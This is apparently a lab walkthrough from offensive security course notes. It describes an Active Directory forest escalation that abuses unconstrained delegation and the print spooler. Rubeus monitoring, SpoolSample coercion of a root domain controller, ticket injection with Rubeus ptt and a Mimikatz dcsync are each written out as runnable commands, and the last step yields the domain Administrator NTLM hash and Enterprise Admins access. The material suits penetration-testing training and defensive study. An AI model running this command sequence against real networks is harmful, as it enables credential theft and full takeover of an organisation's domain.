#This technique does not require Domain Admin privileges. However, if we have Domain Admin privileges and no servers with unconstrained
#delegation exist in our current domain, we can create one ourselves by modifying the configuration of one of the servers.

#In this section, we'll implement the attack without Domain Admin privileges. To do this, we'll first log in to appsrv01 as the Offsec 
#user and open a PowerShell prompt and determine our access to the print spooler service on the rdc01 root domain controller:

ls \\rdc01\pipe\spoolss

#we use Rubeus to monitor for new tickets from the root domain controller machine account:

Rubeus.exe monitor /interval:5 /filteruser:RDC01$

#With Rubeus running, we'll switch back to our PowerShell prompt and launch SpoolSample to force the print change notification from rdc01:

.\SpoolSample.exe rdc01.corp1.com appsrv01.prod.corp1.com

#Now that we have obtained a forwardable TGT for the root domain controller machine account, we can use Rubeus to inject it into memory

Rubeus.exe ptt /ticket:doIE9DCCBPCgAwIBBaEDAgEWooIEBDCCBABhggP8MIID+...

#The root domain controller computer account is not a local administrator on rdc01, so we cannot directly obtain code execution. 
#However, a domain controller computer account has the access right to perform AD replication.

#We can exploit this by forcing a replication with Mimikatz dcsync:

lsadump::dcsync /domain:corp1.com /user:corp1\administrator

#We now have the NTLM password hash of the root domain Administrator account and have obtained access to the Enterprise Admins group.